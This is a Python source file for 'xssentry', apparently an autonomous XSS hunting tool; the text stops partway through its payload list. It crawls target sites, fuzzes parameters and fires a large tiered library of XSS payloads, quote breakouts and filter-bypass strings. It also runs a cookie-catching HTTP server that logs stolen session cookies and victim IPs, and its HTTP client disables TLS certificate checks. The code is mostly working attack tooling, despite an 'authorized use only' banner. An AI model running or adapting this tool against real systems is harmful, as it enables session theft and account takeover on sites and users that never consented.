#!/usr/bin/env python3
"""
██╗  ██╗███████╗███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗
╚██╗██╔╝██╔════╝██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝
 ╚███╔╝ ███████╗███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ 
 ██╔██╗ ╚════██║╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝  
██╔╝ ██╗███████║███████║███████╗██║ ╚████║   ██║   ██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   

  xssentry v4.0 — Autonomous XSS Hunter  [HELLHOUND-class]
  Detected XSS types: Reflected · Stored · DOM · Mutation(mXSS) · uXSS · Blind
  Engines: Reflected · Stored · DOM-based · Mutation(mXSS) · uXSS · Blind XSS
  Pipeline:
    1. Threaded crawl (HTML + JS/SPA)    → endpoint + param discovery
    2. Parallel param discovery          → error-probe + wordlist fuzz
    3. Risk scoring                      → high-risk params first
    4. Reflected XSS                     → inject → verify in same response
    5. Stored XSS                        → inject → visit retrieval URLs → check
    6. DOM XSS                           → JS sink analysis + headless probe
    7. Mutation XSS (mXSS)              → innerHTML mutation bypass payloads
    8. Universal XSS (uXSS)             → cross-origin protocol vectors
    9. Blind XSS                         → OOB callback server + out-of-band confirm
   10. Cookie exfil                      → auto-fire + catch on confirmed XSS

  v3.2 upgrades (HELLHOUND integration):
    · HELLHOUND label system  (ok/warn/err/info/found/phase/section)
    · ThreadPoolExecutor crawler  (parallel page + JS processing)
    · Enhanced JSExtractor  (REST/router/template/WebSocket patterns)
    · Progress bars during crawl and testing
    · Thread-safe tprint with _print_lock
    · Clean status output — crawling noise suppressed, summaries shown
"""

import argparse
import http.server
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser
import asyncio
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_INSTALLED = True
except ImportError:
    PLAYWRIGHT_INSTALLED = False


# ─────────────────────────────────────────────────────────────────────────────
# ANSI COLOR SYSTEM  — HELLHOUND-style with xssentry gradient palette
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ITAL    = "\033[3m"
    # Standard
    RED     = "\033[31m";  GREEN   = "\033[32m"
    YELLOW  = "\033[33m";  BLUE    = "\033[34m"
    MAGENTA = "\033[35m";  CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    # Bright
    BRED    = "\033[91m";  BGREEN  = "\033[92m"
    BYELLOW = "\033[93m";  BBLUE   = "\033[94m"
    BMAGENTA= "\033[95m";  BCYAN   = "\033[96m"
    BWHITE  = "\033[97m"
    # Backgrounds
    BGRED   = "\033[41m";  BGGREEN = "\033[42m"
    BGBLUE  = "\033[44m";  BGMAGENTA="\033[45m"
    # 256-color helpers
    @staticmethod
    def fg(n): return f"\033[38;5;{n}m"
    @staticmethod
    def bg(n): return f"\033[48;5;{n}m"


# ── Core color/label primitives  (HELLHOUND-style) ───────────────────────────
def color(text, *styles):
    return "".join(styles) + str(text) + C.RESET

def label(tag, text, tc=C.BCYAN):
    return (f"{color('[', C.DIM)}{color(tag, tc, C.BOLD)}"
            f"{color(']', C.DIM)} {text}")

# ── XSS-adapted label functions ──────────────────────────────────────────────
def ok(t):       return label("+",       t, C.BGREEN)
def warn(t):     return label("!",       t, C.BYELLOW)
def err(t):      return label("-",       t, C.BRED)
def info(t):     return label("*",       t, C.BCYAN)
def found(t):    return label("FOUND",   t, C.BCYAN)
def js_ep(t):    return label("JS",      t, C.BMAGENTA)
def phase(t):    return label("PHASE",   t, C.BMAGENTA)
def xss_lbl(t):  return label("XSS",    t, C.BRED)
def ck_lbl(t):   return label("COOKIE", t, C.fg(214))
def skp(t):      return label("SKIP",   t, C.DIM)
def hit_lbl(t):  return label("HIT",    t, C.BYELLOW)
def prb_lbl(t):  return label("FUZZ",   t, C.fg(75))
def fp_lbl(t):   return label("FP",     t, C.DIM)

# ── Thread-safe print ────────────────────────────────────────────────────────
_print_lock = threading.Lock()

def tprint(*a, **kw):
    with _print_lock:
        print(*a, **kw)

def _strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', str(s))


# ── Section / progress  (HELLHOUND-style, XSS colors) ───────────────────────
def section(title, icon=""):
    bar = color("─" * 72, C.DIM + C.CYAN)
    mid = (icon + " ") if icon else ""
    tprint(f"\n{bar}")
    tprint(f"  {color(mid + title, C.BOLD + C.BCYAN)}")
    tprint(f"{bar}")

def progress(cur, tot, w=30):
    pct   = cur / tot if tot else 0
    fill  = int(pct * w)
    bar   = color("█" * fill, C.BCYAN) + color("░" * (w - fill), C.DIM)
    pstr  = color(f"{int(pct*100):3d}%", C.BWHITE)
    cstr  = color(f"{cur}/{tot}", C.DIM)
    return f"[{bar}] {pstr} {cstr}"

def divider(char="─", w=70, col=None):
    col = col or C.fg(240)
    return color(char * w, col)


# ─────────────────────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────────────────────

def print_banner():
    art = [
        r" ██╗  ██╗███████╗███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗",
        r" ╚██╗██╔╝██╔════╝██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝",
        r"  ╚███╔╝ ███████╗███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ ",
        r"  ██╔██╗ ╚════██║╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝  ",
        r" ██╔╝ ██╗███████║███████║███████╗██║ ╚████║   ██║   ██║  ██║   ██║   ",
        r" ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   "
    ]
    print()
    for line in art:
        print(color(line, C.BRED, C.BOLD))
    meta = [
        ("Tool",    "X5Sentry \u2014 Autonomous XSS Hunter"),
        ("Version", "3.2  [HELLHOUND-engine \xb7 ThreadPool \xb7 Enhanced-JS \xb7 Fast-Parallel]"),
        ("Engine",  "Crawl(HTML+JS/SPA) \u2192 ParamDiscover \u2192 XSS \u2192 Verify \u2192 Cookie-Exfil"),
        ("Safety",  "4-stage FP elimination \xb7 non-destructive probes \xb7 authorized use only"),
    ]
    for k, v in meta:
        print(f"  {color(k+':', C.BYELLOW, C.BOLD):<28} {color(v, C.BWHITE)}")
    print()
    print(color("  \u26a0  For authorized security testing only. Use responsibly.", C.BYELLOW))
    print(color("  " + "\u2500" * 68, C.DIM))
    print()
# ─────────────────────────────────────────────────────────────────────────────
# COOKIE CATCH SERVER
# ─────────────────────────────────────────────────────────────────────────────
class CookieCatcher:
    caught = []
    _lock  = threading.Lock()

    def __init__(self, host="0.0.0.0", port=8765):
        self.host = host; self.port = port
        self.server = None; self._thread = None; self.url = None

    @staticmethod
    def _local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def start(self):
        catcher_ref = self
        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                qs     = urllib.parse.parse_qs(parsed.query)
                cookie = qs.get("c", qs.get("cookie", [""]))[0]
                ua     = self.headers.get("User-Agent", "")
                src_ip = self.client_address[0]
                ts     = datetime.now().strftime("%H:%M:%S")
                if cookie:
                    entry = {"ts": ts, "ip": src_ip, "cookie": cookie, "ua": ua}
                    with CookieCatcher._lock:
                        CookieCatcher.caught.append(entry)
                    tprint(f"\n  {ck_lbl('COOKIE RECEIVED!')} {color(ts, C.DIM)}")
                    tprint(f"  {color('  From IP :', C.BYELLOW)} {color(src_ip, C.BWHITE)}")
                    tprint(f"  {color('  Cookie  :', C.BYELLOW)} {color(cookie, C.fg(214), C.BOLD)}")
                    tprint(f"  {color('  UA      :', C.DIM)} {color(ua[:80], C.DIM)}\n")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")
            def log_message(self, *a): pass
        try:
            self.server  = http.server.HTTPServer((self.host, self.port), _Handler)
            self.url     = f"http://{self._local_ip()}:{self.port}"
            self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self._thread.start()
            return self.url
        except OSError as e:
            tprint(f"  {warn(f'Cookie server failed on :{self.port} → {e}')}")
            return None

    def stop(self):
        if self.server: self.server.shutdown()

    def summary(self): return list(CookieCatcher.caught)


# ─────────────────────────────────────────────────────────────────────────────
# SSL + HTTP CLIENT
# ─────────────────────────────────────────────────────────────────────────────
_SSL = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode    = ssl.CERT_NONE

_HDR = {
    "User-Agent":      ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/124.0.0.0 Safari/537.36"),
    "Accept":          "text/html,application/xhtml+xml,application/json,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection":      "close",
}

class HTTPClient:
    def __init__(self, timeout=12): self.timeout = timeout

    def get(self, url, params=None):
        if params:
            qs  = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            url = url + ("&" if "?" in url else "?") + qs
        return self._do(url, None, "GET", _HDR)

    def post(self, url, data=None):
        if data:
            body = urllib.parse.urlencode(data).encode()
            hdrs = {**_HDR, "Content-Type": "application/x-www-form-urlencoded"}
        else:
            body, hdrs = None, _HDR
        return self._do(url, body, "POST", hdrs)

    def get_raw(self, url): return self._do(url, None, "GET", _HDR)

    def _do(self, url, body, method, hdrs):
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        t0  = time.time()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=_SSL) as r:
                el   = time.time() - t0
                text = r.read(1024 * 1024).decode("utf-8", errors="replace")
                return {"ok": True, "status": r.status, "body": text,
                        "elapsed": el, "url": url, "headers": dict(r.headers), "error": None}
        except urllib.error.HTTPError as e:
            el = time.time() - t0
            try:    text = e.read(512 * 1024).decode("utf-8", errors="replace")
            except: text = ""
            return {"ok": False, "status": e.code, "body": text,
                    "elapsed": el, "url": url, "headers": {}, "error": str(e)}
        except Exception as ex:
            el = time.time() - t0
            return {"ok": False, "status": 0, "body": "",
                    "elapsed": el, "url": url, "headers": {}, "error": str(ex)}


# ─────────────────────────────────────────────────────────────────────────────
# JS / SPA ENDPOINT EXTRACTOR  — HELLHOUND patterns adapted for XSS
# ─────────────────────────────────────────────────────────────────────────────
class JSExtractor:
    """
    HELLHOUND JSExtractor adapted for XSS parameter discovery.

    Patterns (ported from HELLHOUND v5.7):
      _REST     — axios/fetch/$ajax/http.get/XMLHttpRequest/API path literals
      _TEMPLATE — backtick template literals containing paths
      _ROUTER   — Express/Vue/React router definitions
      _QS       — query string parameter names
      _BODY     — JSON.stringify({...}) key extraction
      _WS       — WebSocket endpoint discovery (XSS via ws: URLs)

    XSS-specific additions:
      _REFLECT  — reflected parameter hints in JS (response.param, data.field)
      _SINK     — dangerous JS sinks near URL params (document.write, innerHTML)
    """
    # ── HELLHOUND REST patterns ───────────────────────────────────────────────
    _REST = [
        re.compile(r'axios\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'fetch\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'\$\.(get|post|ajax)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'(?:this\.|self\.)?(?:http|api)\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'XMLHttpRequest[^;]{0,200}\.open\s*\(\s*["\']([A-Z]+)["\']\s*,\s*["\']([^"\']{3,80})["\']', re.I),
        re.compile(r'["\`](/(?:api|v\d+|rest|graphql|admin|auth|user|account|search|upload|ws)[a-zA-Z0-9_\-\./]*)["\`]', re.I),
    ]
    # ── HELLHOUND template literal pattern ────────────────────────────────────
    _TEMPLATE = re.compile(r'`(/[^`\n]{3,80})`')
    # ── HELLHOUND router pattern ──────────────────────────────────────────────
    _ROUTER   = re.compile(r'(?:router|app|Route)\s*\.\s*(get|post|put|delete|patch|use)\s*\(\s*["\']([^"\']{2,60})["\']', re.I)
    # ── HELLHOUND query-string + body patterns ────────────────────────────────
    _QS       = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', re.I)
    _BODY     = re.compile(r'JSON\.stringify\s*\(\s*\{([^}]{3,300})\}', re.DOTALL)
    _KEY_OBJ  = re.compile(r'["\']?([a-zA-Z_][a-zA-Z0-9_]{1,30})["\']?\s*:', re.I)
    # ── HELLHOUND WebSocket discovery ────────────────────────────────────────
    _WS       = re.compile(r'new\s+WebSocket\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I)

    # ── XSS-specific: reflected param hints and dangerous sinks ───────────────
    _REFLECT  = re.compile(
        r'(?:response|res|data|result|json)\s*\.\s*([a-zA-Z_][a-zA-Z0-9_]{1,30})', re.I)
    _SINK     = re.compile(
        r'(?:document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval|'
        r'location\.href|location\.replace|location\.assign)\s*[=(]'
        r'[^;]{0,120}([a-zA-Z_][a-zA-Z0-9_]{1,30})', re.I)

    # ── Noise filter ──────────────────────────────────────────────────────────
    _NOISE = re.compile(
        r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|min\.js)$'
        r'|^/static/|^/assets/|^/images/|^/fonts/|^/dist/', re.I)
    _JS_KW = {
        'function','return','var','let','const','if','else','for','while',
        'switch','case','break','continue','typeof','instanceof','import',
        'export','class','extends','new','this','super','null','undefined',
        'true','false','try','catch','finally','throw','async','await'
    }

    def _valid_path(self, p):
        if not p or not isinstance(p, str): return False
        p = p.split("?")[0].split("#")[0]
        if not p.startswith("/"): return False
        if len(p) < 2 or len(p) > 120: return False
        if self._NOISE.search(p): return False
        return bool([s for s in p.split("/") if s])

    def _norm(self, p):
        p = p.split("#")[0].split("?")[0]
        p = re.sub(r'/\d+', '/{id}', p)
        p = re.sub(r'/[0-9a-f]{8,}', '/{id}', p, flags=re.I)
        p = re.sub(r'\$\{[^}]+\}', '{var}', p)
        p = re.sub(r'//+', '/', p)
        return p.rstrip("/") or "/"

    def extract(self, js_content, base_url=""):
        """
        Extract REST endpoints, router definitions, template paths, and
        infer XSS-relevant parameters from JS source.

        Returns list of endpoint dicts:
          {path, method, params, source, base_url, ws_endpoints}
        """
        results = {}
        ws_endpoints = []

        def add(path, method, params, source):
            if not self._valid_path(path): return
            norm = self._norm(path)
            if norm in results:
                ex = results[norm]
                if ex["method"] == "GET" and method != "GET":
                    ex["method"] = method
                ex["params"] = sorted(set(ex["params"] + params))
            else:
                results[norm] = {
                    "path":     norm,
                    "method":   method.upper(),
                    "params":   params,
                    "source":   source,
                    "base_url": base_url,
                }

        # ── REST calls ────────────────────────────────────────────────────────
        for pat in self._REST:
            for m in pat.finditer(js_content):
                groups = m.groups()
                if len(groups) == 1:
                    path, method = groups[0], "GET"
                else:
                    a, b = groups[0], groups[1]
                    if a.upper() in ("GET","POST","PUT","DELETE","PATCH"):
                        method, path = a.upper(), b
                    elif b.upper() in ("GET","POST","PUT","DELETE","PATCH"):
                        method, path = b.upper(), a
                    else:
                        path, method = a, "GET"
                qs_params = self._QS.findall(path)
                add(path.split("?")[0], method, qs_params, "js_rest")

        # ── Router definitions ────────────────────────────────────────────────
        for m in self._ROUTER.finditer(js_content):
            method, path = m.group(1), m.group(2)
            if method.lower() == "use": method = "GET"
            add(path, method, [], "js_router")

        # ── Template literals ─────────────────────────────────────────────────
        for m in self._TEMPLATE.finditer(js_content):
            path = m.group(1)
            if any(kw in path for kw in ["api","v1","v2","rest","graphql","admin","auth","search"]):
                add(path.split("?")[0], "GET", [], "js_template")

        # ── Body params from JSON.stringify ───────────────────────────────────
        body_params = set()
        for m in self._BODY.finditer(js_content):
            for k in self._KEY_OBJ.findall(m.group(1)):
                if k.lower() not in self._JS_KW and len(k) > 1:
                    body_params.add(k)
        for ep in results.values():
            if ep["method"] in ("POST", "PUT", "PATCH") and body_params:
                ep["params"] = sorted(set(ep["params"]) | body_params)

        # ── WebSocket endpoints ───────────────────────────────────────────────
        ws_endpoints = [m.group(1) for m in self._WS.finditer(js_content)]

        # ── XSS: reflected response fields as parameter hints ─────────────────
        reflect_hints = set()
        for m in self._REFLECT.finditer(js_content):
            k = m.group(1)
            if k.lower() not in self._JS_KW and 2 < len(k) < 30:
                reflect_hints.add(k)

        # ── XSS: dangerous sinks — param names near sinks get high priority ───
        sink_params = set()
        for m in self._SINK.finditer(js_content):
            k = m.group(1)
            if k.lower() not in self._JS_KW and 2 < len(k) < 30:
                sink_params.add(k)

        # Attach reflect/sink hints to any GET endpoint (XSS usually GET-reflected)
        if reflect_hints or sink_params:
            for ep in results.values():
                if ep["method"] == "GET":
                    ep["params"] = sorted(
                        set(ep["params"]) | reflect_hints | sink_params)
                    if sink_params:
                        ep["source"] += "+sink"

        result_list = list(results.values())
        for ep in result_list:
            ep["ws_endpoints"] = ws_endpoints
        return result_list


# ─────────────────────────────────────────────────────────────────────────────
# HTML PARSER
# ─────────────────────────────────────────────────────────────────────────────
class PageParser(HTMLParser):
    def __init__(self, base):
        super().__init__()
        self.base = base
        self._bp  = urllib.parse.urlparse(base)
        self.links    = set()
        self.js_links = set()
        self.forms    = []
        self._form    = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a":
            h = (a.get("href") or "").strip()
            if h and not h.startswith(("javascript:", "mailto:", "#", "tel:", "data:")):
                full = urllib.parse.urljoin(self.base, h)
                if urllib.parse.urlparse(full).netloc == self._bp.netloc:
                    self.links.add(full)
        elif tag == "script":
            s = (a.get("src") or "").strip()
            if s:
                full = urllib.parse.urljoin(self.base, s)
                if urllib.parse.urlparse(full).netloc == self._bp.netloc:
                    self.js_links.add(full)
        elif tag == "form":
            self._form = {
                "action": urllib.parse.urljoin(self.base, a.get("action", self.base)),
                "method": a.get("method", "GET").upper(),
                "inputs": []
            }
        elif tag in ("input", "textarea", "select") and self._form is not None:
            n = a.get("name") or a.get("id")
            t = a.get("type", "text").lower()
            if n and t not in ("submit", "button", "reset", "image", "file"):
                self._form["inputs"].append(
                    {"name": n, "type": t, "value": a.get("value", "test")})

    def handle_endtag(self, tag):
        if tag == "form" and self._form:
            if any(i["type"] != "hidden" for i in self._form["inputs"]):
                self.forms.append(self._form)
            self._form = None


# ─────────────────────────────────────────────────────────────────────────────
# COMMON PARAMETER WORDLIST
# ─────────────────────────────────────────────────────────────────────────────
COMMON_PARAMS = [
    "q","s","search","query","term","keyword","keywords","find","text","input",
    "name","title","subject","content","body","message","description","comment",
    "page","p","pg","id","num","index","offset","limit","start","end",
    "next","prev","return","redirect","url","link","href","src","ref",
    "returnUrl","return_url","next_url","goto","go","back",
    "user","username","email","password","pass","pwd","token","key","secret",
    "auth","login","session","access_token","api_key","apikey",
    "output","format","type","view","mode","lang","locale","language",
    "template","theme","style","layout","render","display","show","tab",
    "file","path","dir","folder","doc","document","load","read","include",
    "data","value","val","code","hash","tag","category","cat","filter","sort",
    "order","field","col","size","color","colour",
    "callback","jsonp","action","method","event","ajax",
    "error","msg","debug","note","reason","info","detail","tip","hint",
    "preview","sandbox","test","trace","alert","warn",
]


# ─────────────────────────────────────────────────────────────────────────────
# XSS PAYLOAD LIBRARY
# ─────────────────────────────────────────────────────────────────────────────
PAYLOADS = [
    # ─────────────────────────────────────────────────────────────────────
    # TIER 1 — raw HTML injection (no context escape needed)
    # Used first: fast signal whether any XSS is possible at all.
    # ─────────────────────────────────────────────────────────────────────
    {"id":"t1_script",        "pl":'<script>alert(1)</script>',                    "tier":1,"type":"html"},
    {"id":"t1_script_sl",     "pl":'<script>alert(1)//',                           "tier":1,"type":"html"},
    {"id":"t1_script_cm",     "pl":'<script>alert(1)<!–',                          "tier":1,"type":"html"},
    {"id":"t1_img",           "pl":'<img src=x onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_img_slash",     "pl":'<img/src=x/onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_img_sp",        "pl":'<img src =q onerror=alert(1)>',                "tier":1,"type":"html"},
    {"id":"t1_img2",          "pl":'<img src/onerror=alert(1)>',                   "tier":1,"type":"html"},
    {"id":"t1_image",         "pl":'<image/src/onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_image2",        "pl":'<image src/onerror=alert(1)>',                 "tier":1,"type":"html"},
    {"id":"t1_image_sp",      "pl":'<image src =q onerror=alert(1)>',              "tier":1,"type":"html"},
    {"id":"t1_svg",           "pl":'<svg onload=alert(1)>',                        "tier":1,"type":"html"},
    {"id":"t1_svg_ns",        "pl":'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>', "tier":1,"type":"html"},
    {"id":"t1_body_load",     "pl":'<body onload=alert(1)>',                       "tier":1,"type":"html"},
    {"id":"t1_body_page",     "pl":'<body onpageshow=alert(1)>',                   "tier":1,"type":"html"},
    {"id":"t1_body_focus",    "pl":'<body onfocus=alert(1)>',                      "tier":1,"type":"html"},
    {"id":"t1_body_err",      "pl":'<body onerror=alert(1) onload=/>',             "tier":1,"type":"html"},
    {"id":"t1_audio_src",     "pl":'<audio src onloadstart=alert(1)>',             "tier":1,"type":"html"},
    {"id":"t1_video",         "pl":'<video onloadstart=alert(1)><source>',         "tier":1,"type":"html"},
    {"id":"t1_marquee",       "pl":'<marquee onstart=alert(1)>',                   "tier":1,"type":"html"},
    {"id":"t1_input_af",      "pl":'<input autofocus onblur=alert(1)>',            "tier":1,"type":"html"},
    {"id":"t1_input_focus",   "pl":'<input autofocus onfocus=alert(1)>',           "tier":1,"type":"html"},

    # ─────────────────────────────────────────────────────────────────────
    # TIER 2 — attribute/quote breakout
    # For values reflected inside HTML attributes (href, src, value="...", etc.)
    # ─────────────────────────────────────────────────────────────────────
    {"id":"t2_dq_script",     "pl":'"><script>alert(1)</script>',                  "tier":2,"type":"attr"},
    {"id":"t2_sq_script",     "pl":"'><script>alert(1)</script>",                  "tier":2,"type":"attr"},
    {"id":"t2_dq_svg",        "pl":'"><svg onload=alert(1)//',                     "tier":2,"type":"attr"},
    {"id":"t2_dq_img",        "pl":'"><img src=x onerror=alert(1)>',               "tier":2,"type":"attr"},
    {"id":"t2_dq_img_gif",    "pl":'"><img src=1 onerror=alert(1)>.gif',           "tier":2,"type":"attr"},
    {"id":"t2_dq_om",         "pl":'"onmouseover=alert(1)//',                      "tier":2,"type":"attr"},
    {"id":"t2_dq_af",         "pl":'"autofocus/onfocus=alert(1)//',                "tier":2,"type":"attr"},
    {"id":"t2_ev_dq",         "pl":'" onmouseover=alert(1) x="',                  "tier":2,"type":"attr"},
    {"id":"t2_ev_sq",         "pl":"' onfocus=alert(1) autofocus x='",             "tier":2,"type":"attr"},
    # Email-field context (onclick in value that is an email address)
    {"id":"t2_email_click",   "pl":'"onclick=alert(1)>"@x.y',                     "tier":2,"type":"attr"},
    {"id":"t2_email_svg",     "pl":'"onclick=alert(1)><svg/onload=alert(1)>"@x.y', "tier":2,"type":"attr"},
    # Interaction-based attribute events (useful when JS filtering is loose)
    {"id":"t2_x_click",       "pl":'<x onclick=alert(1)>click this!',             "tier":2,"type":"attr"},
    {"id":"t2_x_dblclick",    "pl":'<x ondblclick=alert(1)>double click this!',   "tier":2,"type":"attr"},
    {"id":"t2_x_hover",       "pl":'<x onmouseover=alert(1)>hover this!',         "tier":2,"type":"attr"},
    {"id":"t2_x_mousedown",   "pl":'<x onmousedown=alert(1)>click this!',         "tier":2,"type":"attr"},
    {"id":"t2_x_copy",        "pl":'<x oncopy=alert(1)>copy this!',               "tier":2,"type":"attr"},
    {"id":"t2_x_ctx",         "pl":'<x oncontextmenu=alert(1)>right click this!', "tier":2,"type":"attr"},
    {"id":"t2_x_drag",        "pl":'<x ondrag=alert(1)>drag this!',               "tier":2,"type":"attr"},
    {"id":"t2_x_focus",       "pl":'<x contenteditable onfocus=alert(1)>focus this!', "tier":2,"type":"attr"},
    {"id":"t2_x_input",       "pl":'<x contenteditable oninput=alert(1)>input here!',  "tier":2,"type":"attr"},
    {"id":"t2_x_keydown",     "pl":'<x contenteditable onkeydown=alert(1)>press any key!', "tier":2,"type":"attr"},
    {"id":"t2_x_paste",       "pl":'<x contenteditable onpaste=alert(1)>paste here!',  "tier":2,"type":"attr"},
    {"id":"t2_x_blur",        "pl":'<x contenteditable onblur=alert(1)>lose focus!',   "tier":2,"type":"attr"},
    # Button / form events
    {"id":"t2_btn_click",     "pl":'<button onclick="alert(1)">test</button>',    "tier":2,"type":"attr"},
    {"id":"t2_btn_af",        "pl":'<button autofocus onfocus=alert(1)>test</button>', "tier":2,"type":"attr"},
    {"id":"t2_form_sub",      "pl":'<form onsubmit=alert(1)><input type=submit>',  "tier":2,"type":"attr"},
    {"id":"t2_select",        "pl":'<select onchange=alert(1)><option>1<option>2', "tier":2,"type":"attr"},
    # Anchor / link events
    {"id":"t2_a_click",       "pl":'<a onclick="alert(1)">test</a>',              "tier":2,"type":"attr"},
    {"id":"t2_a_hover",       "pl":'<a onmouseover="alert(1)">test</a>',          "tier":2,"type":"attr"},
    {"id":"t2_a_dbl",         "pl":'<a ondblclick="alert(1)">test</a>',           "tier":2,"type":"attr"},
    # Drag events
    {"id":"t2_a_drag",        "pl":'<a draggable="true" ondrag="alert(1)">test</a>', "tier":2,"type":"attr"},
    {"id":"t2_a_dragstart",   "pl":'<a draggable="true" ondragstart="alert(1)">test</a>', "tier":2,"type":"attr"},

    # ─────────────────────────────────────────────────────────────────────
    # TIER 3 — JS string/template context breakout
    # For values reflected inside <script> blocks or event handler strings.
    # ─────────────────────────────────────────────────────────────────────
    {"id":"t3_jsdq",          "pl":'";alert(1)//',                                 "tier":3,"type":"js"},
    {"id":"t3_jssq",          "pl":"';alert(1)//",                                 "tier":3,"type":"js"},
    {"id":"t3_jssq2",         "pl":"'-alert(1)-'",                                 "tier":3,"type":"js"},
    {"id":"t3_jsdq2",         "pl":'"-alert(1)-"',                                 "tier":3,"type":"js"},
    {"id":"t3_jssq3",         "pl":"'-alert(1)//",                                 "tier":3,"type":"js"},
    {"id":"t3_jssq_bs",       "pl":"\\'-alert(1)//",                               "tier":3,"type":"js"},
    {"id":"t3_tpl",           "pl":"`${alert(1)}",                                 "tier":3,"type":"js"},
    {"id":"t3_close",         "pl":"</script><svg onload=alert(1)>",               "tier":3,"type":"js"},
    {"id":"t3_close2",        "pl":"</script><script>alert(1)</script>",           "tier":3,"type":"js"},
    {"id":"t3_cmt",           "pl":"*/alert(1)</script><script>/*",                "tier":3,"type":"js"},
    {"id":"t3_cmt2",          "pl":"*/alert(1)\">'onload=\"/*<svg/1='",            "tier":3,"type":"js"},
    {"id":"t3_cmt3",          "pl":"*/alert(1)</script>'>alert(1)/*<script/1='",   "tier":3,"type":"js"},
    {"id":"t3_sq_load",       "pl":"'onload=alert(1)><svg/1='",                    "tier":3,"type":"js"},
    {"id":"t3_sq_close",      "pl":"'>alert(1)</script><script/1='",               "tier":3,"type":"js"},
    {"id":"t3_tpl_load",      "pl":"`-alert(1)\">'onload=\"`<svg/1='",             "tier":3,"type":"js"},
    # eval variants (inline JS execution)
    {"id":"t3_eval_wdq",      "pl":"\"-eval(\"window['pro'%2B'mpt'](8)\")-\"",    "tier":3,"type":"js"},
    {"id":"t3_eval_wsq",      "pl":"'-eval(\"window['pro'%2B'mpt'](8)\")-'",      "tier":3,"type":"js"},
    {"id":"t3_js_assign",     "pl":"';a=prompt,a()//",                             "tier":3,"type":"js"},
    {"id":"t3_js_assign_dq",  "pl":'";a=prompt,a()//',                             "tier":3,"type":"js"},

    # ─────────────────────────────────────────────────────────────────────
    # TIER 4 — filter bypass (case, entities, whitespace, encoding)
    # For apps with basic XSS filters that block lowercase tags/events.
    # ─────────────────────────────────────────────────────────────────────
    # Case mangling
    {"id":"t4_case_script",   "pl":'<ScRiPt>alert(1)</ScRiPt>',                   "tier":4,"type":"html"},
    {"id":"t4_case_X",        "pl":'<X onxxx=1',                                   "tier":4,"type":"html"},
    {"id":"t4_case_OnX",      "pl":'<x OnXxx=1',                                   "tier":4,"type":"html"},
    # HTML entity encoding
    {"id":"t4_svg_ent",       "pl":'<svg/onload=&#x61;lert(1)>',                   "tier":4,"type":"html"},
    {"id":"t4_alert_ent1",    "pl":'alert&lpar;1&rpar;',                            "tier":4,"type":"html"},
    {"id":"t4_alert_ent2",    "pl":'alert&#x28;1&#x29',                             "tier":4,"type":"html"},
    {"id":"t4_alert_ent3",    "pl":'alert&#40;1&#41',                               "tier":4,"type":"html"},
    # No-space tricks
    {"id":"t4_nospace",       "pl":'<img/src=x/onerror=alert(1)>',                 "tier":4,"type":"html"},
    {"id":"t4_slash_sep",     "pl":'<x/onxxx=1',                                   "tier":4,"type":"html"},
    # Whitespace injection (tab, newline, CR, FF)
    {"id":"t4_tab",           "pl":'<img src=x\tonerror=alert(1)>',                "tier":4,"type":"html"},
    {"id":"t4_nl",            "pl":'<img src=x\nonerror=alert(1)>',                "tier":4,"type":"html"},
    {"id":"t4_ws_tab",        "pl":'<x%09onxxx=1',                                 "tier":4,"type":"html"},
